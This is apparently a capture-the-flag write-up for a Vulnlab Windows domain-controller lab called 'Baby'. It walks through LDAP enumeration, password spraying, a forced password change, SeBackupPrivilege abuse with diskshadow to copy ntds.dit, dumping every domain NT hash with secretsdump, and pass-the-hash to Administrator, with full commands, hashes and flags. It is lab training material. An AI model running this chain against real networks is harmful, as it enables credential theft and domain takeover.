# Baby(HTB) - Vulnlab

## Recon

as usual we started with nmap 

```bash
──(cyberghost㉿vbox)-[~/htb/vip+/vulnlabs/baby]
└─$ nmap -sC -sV -Pn baby.htb      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 12:54 UTC
Nmap scan report for baby.htb (10.129.114.59)
Host is up (0.29s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-23 07:25:22Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-23T07:26:23+00:00; -5h29m44s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-08-18T12:14:43
|_Not valid after:  2026-02-17T12:14:43
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-23T07:25:41+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -5h29m44s, deviation: 0s, median: -5h29m44s
| smb2-time: 
|   date: 2025-09-23T07:25:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.62 seconds
```

from the above we can see that various services running.

## enumeration and initial Access

for enumeration we started with smb and checked whether there is a guest login using `nxc` 

and we obtained the following results 

```bash
┌──(cyberghost㉿vbox)-[~/htb/vip+/vulnlabs/baby]
└─$ nxc smb baby.htb -u '' -p ''     
SMB         10.129.114.59   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.129.114.59   445    BABYDC           [+] baby.vl\: 
```

so we tried to enumerate the usernames using nxc and `ldap` service and we obtained the following results 

```bash
┌──(cyberghost㉿vbox)-[~/htb/vip+/vulnlabs/baby]
└─$ nxc ldap baby.htb -u '' -p '' --users 
LDAP        10.129.114.59   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.114.59   389    BABYDC           [+] baby.vl\: 
LDAP        10.129.114.59   389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        10.129.114.59   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-                                 
LDAP        10.129.114.59   389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain                                                                                                                                                   
LDAP        10.129.114.59   389    BABYDC           Jacqueline.Barnett            2021-11-21 15:11:03 0                                                      
LDAP        10.129.114.59   389    BABYDC           Ashley.Webb                   2021-11-21 15:11:03 0                                                      
LDAP        10.129.114.59   389    BABYDC           Hugh.George                   2021-11-21 15:11:03 0                                                      
LDAP        10.129.114.59   389    BABYDC           Leonard.Dyer                  2021-11-21 15:11:03 0                                                      
LDAP        10.129.114.59   389    BABYDC           Connor.Wilkinson              2021-11-21 15:11:08 0                                                      
LDAP        10.129.114.59   389    BABYDC           Joseph.Hughes                 2021-11-21 15:11:08 0                                                      
LDAP        10.129.114.59   389    BABYDC           Kerry.Wilson                  2021-11-21 15:11:08 0                                                      
LDAP        10.129.114.59   389    BABYDC           Teresa.Bell                   2021-11-21 15:14:37 0        Set initial password to BabyStart123!  
```

from the above results we can see that the `Teresa.Bell` have given a message called `Set initial password to BabyStart123!` , we tried to log into the user using these credentials but failed so we tried to enumerate more users using `ldapsearch` 

```bash
┌──(cyberghost㉿vbox)-[~/htb/vip+/vulnlabs/baby]
└─$ ldapsearch -x -b "dc=baby, dc=vl" "*" -H ldap://10.129.114.59 
```

since the result amount is huge which includes various information we tried to filter that using `grep`

since the results heading that is `#` we filtered the results using `#` 

```bash
┌──(cyberghost㉿vbox)-[~/htb/vip+/vulnlabs/baby]
└─$ ldapsearch -x -b "dc=baby, dc=vl" "*" -H ldap://10.129.114.59  | grep "#"
# extended LDIF
#
# LDAPv3
# base <dc=baby, dc=vl> with scope subtree
# filter: (objectclass=*)
# requesting: * 
#
# baby.vl
# Administrator, Users, baby.vl
# Guest, Users, baby.vl
# krbtgt, Users, baby.vl
# Domain Computers, Users, baby.vl
# Domain Controllers, Users, baby.vl
# Schema Admins, Users, baby.vl
# Enterprise Admins, Users, baby.vl
# Cert Publishers, Users, baby.vl
# Domain Admins, Users, baby.vl
# Domain Users, Users, baby.vl
# Domain Guests, Users, baby.vl
# Group Policy Creator Owners, Users, baby.vl
# RAS and IAS Servers, Users, baby.vl
# Allowed RODC Password Replication Group, Users, baby.vl
# Denied RODC Password Replication Group, Users, baby.vl
# Read-only Domain Controllers, Users, baby.vl
# Enterprise Read-only Domain Controllers, Users, baby.vl
# Cloneable Domain Controllers, Users, baby.vl
# Protected Users, Users, baby.vl
# Key Admins, Users, baby.vl
# Enterprise Key Admins, Users, baby.vl
# DnsAdmins, Users, baby.vl
# DnsUpdateProxy, Users, baby.vl
# dev, Users, baby.vl
# Jacqueline Barnett, dev, baby.vl
# Ashley Webb, dev, baby.vl
# Hugh George, dev, baby.vl
# Leonard Dyer, dev, baby.vl
# Ian Walker, dev, baby.vl
# it, Users, baby.vl
# Connor Wilkinson, it, baby.vl
# Joseph Hughes, it, baby.vl
# Kerry Wilson, it, baby.vl
# Teresa Bell, it, baby.vl
# Caroline Robinson, it, baby.vl
# search reference
# search reference
# search reference
# search result
# numResponses: 40
# numEntries: 36
# numReferences: 3
```

using the above we created a username list called `user` for password spraying 

on password spraying using `nxc` with the user list and default password we obtained the following result 

```bash
┌──(cyberghost㉿vbox)-[~/htb/vip+/vulnlabs/baby]
└─$ nxc smb baby.htb -u users -p BabyStart123!  
SMB         10.129.114.59   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.129.114.59   445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.114.59   445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.114.59   445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.114.59   445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.114.59   445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.114.59   445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.114.59   445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.114.59   445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.114.59   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.114.59   445    BABYDC           [-] baby.vl\:BabyStart123! STATUS_LOGON_FAILURE 
```

from the above we can see that the user `Caroline.Robinson:BabyStart123!` status is `STATUS_PASSWORD_MUST_CHANGE` on searching online we found that this can be done using `kpasswd` but it requires a config file `krb5.conf` so we edited the file present in the directory `/etc` with the following configuration 

```bash
[libdefaults]
    default_realm = BABY.VL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true
    rdns = false

[realms]
    BABY.VL = {
        kdc = BabyDC.baby.vl
        admin_server = BabyDC.baby.vl
    }

[domain_realm]
    .baby.vl = BABY.VL
    baby.vl = BABY.VL
```

after initial configuration we proceed with changing password of the user using `kpasswd`

```bash
┌──(cyberghost㉿vbox)-[~/htb/vip+/vulnlabs/baby]
└─$ kpasswd Caroline.Robinson

Password for Caroline.Robinson@BABY.VL: 
Enter new password: 
Enter it again: 
Password changed.
```

we tried whether these credentials works with `winrm` using `nxc` and we obtained the following results 

```bash
┌──(cyberghost㉿vbox)-[~/htb/vip+/vulnlabs/baby]
└─$ nxc winrm baby.htb -u Caroline.Robinson -p Pass@123                                             
WINRM       10.129.114.59   5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.114.59   5985   BABYDC           [+] baby.vl\Caroline.Robinson:Pass@123 (Pwn3d!) 
```

## User Flag

we logged into the user using `evil-winrm` and obtained the user flag 

```bash
┌──(cyberghost㉿vbox)-[~/htb/vip+/vulnlabs/baby]
└─$ evil-winrm -i baby.htb -u Caroline.Robinson -p Pass@123                
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> type user.txt 
6d8a98f035c5fe83899594532f58e998
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> 
```

## Privilege Escalation

on enumerating the user privileges using `whoami \priv` we found the following privilege 

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

among these two privilege stood out `SeBackupPrivilege` and `SeRestorePrivilege` 

upon searching online how to escalate the privileges using these we came across a github repo 

[https://github.com/k4sth4/SeBackupPrivilege](https://github.com/k4sth4/SeBackupPrivilege)

using this repository we escalated our privilege by following the steps mentioned in the repository 

uploaded and imported the modules 

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop\SeBackupPrivilege> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop\SeBackupPrivilege> Import-Module .\SeBackupPrivilegeUtils.dll
```

then created a file named **`vss.dsh` using the following contents** 

```bash
set context persistent nowriters
set metadata c:\\programdata\\test.cab        
set verbose on
add volume c: alias test
create
expose %test% z:
```

changed the file format

```bash
unix2dos vss.dsh
```

uploaded the file in the directory `C:\ProgramData`

```bash
*Evil-WinRM* PS C:\ProgramData> upload vss.dsh
                                        
Info: Uploading /home/cyberghost/htb/vip+/vulnlabs/baby/vss.dsh to C:\ProgramData\vss.dsh
                                        
Data: 200 bytes of 200 bytes copied
                                        
Info: Upload successful!
```

used `diskshadow` to explore the func of copy

```bash
Evil-WinRM* PS C:\ProgramData> diskshadow /s c:\\programdata\\vss.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  9/23/2025 8:14:41 AM

-> set context persistent nowriters
-> set metadata c:\\programdata\\test.cab
-> set verbose on
-> add volume c: alias test
-> create

Alias test for shadow ID {43e9f672-697d-4400-aed9-c64d3115c7bc} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {acb6eee4-80f2-40ae-b0f6-e2d79ad840a1} set as environment variable.
Inserted file Manifest.xml into .cab file test.cab
Inserted file DisF7F3.tmp into .cab file test.cab

Querying all shadow copies with the shadow copy set ID {acb6eee4-80f2-40ae-b0f6-e2d79ad840a1}

        * Shadow copy ID = {43e9f672-697d-4400-aed9-c64d3115c7bc}               %test%
                - Shadow copy set: {acb6eee4-80f2-40ae-b0f6-e2d79ad840a1}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 9/23/2025 8:14:42 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %test% z:
-> %test% = {43e9f672-697d-4400-aed9-c64d3115c7bc}
The shadow copy was successfully exposed as z:\.
->
```

copied and downloaded `ntds.dit` and `SYSTEM` for credential dumping 

```bash
*Evil-WinRM* PS C:\ProgramData> Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\programdata\\ntds.dit
*Evil-WinRM* PS C:\ProgramData> reg save HKLM\SYSTEM C:\\programdata\\SYSTEM
The operation completed successfully.
```

```bash
*Evil-WinRM* PS C:\ProgramData> download ntds.dit

Info: Downloading C:\ProgramData\ntds.dit to ntds.dit

Info: Download successful!
*Evil-WinRM* PS C:\ProgramData> download SYSTEM
                                        
Info: Downloading C:\ProgramData\SYSTEM to SYSTEM
                                        
Info: Download successful!         
```

after this we dumped the hashed of the users using `secretdump` from `impacket`

```bash
┌──(cyberghost㉿vbox)-[~/htb/vip+/vulnlabs/baby]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL                                          
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::
redated
[*] Cleaning up... 
```

## Root Flag

using pass the hash attack through `evil-winrm` we go the root flag 

```bash
┌──(cyberghost㉿vbox)-[~/htb/vip+/vulnlabs/baby]
└─$ evil-winrm -i baby.htb -u administrator -H ee4457ae59f1e3fbd764e33d9cef123d    
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop 
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt 
907465b820290a7383b0bf8544b0d805
```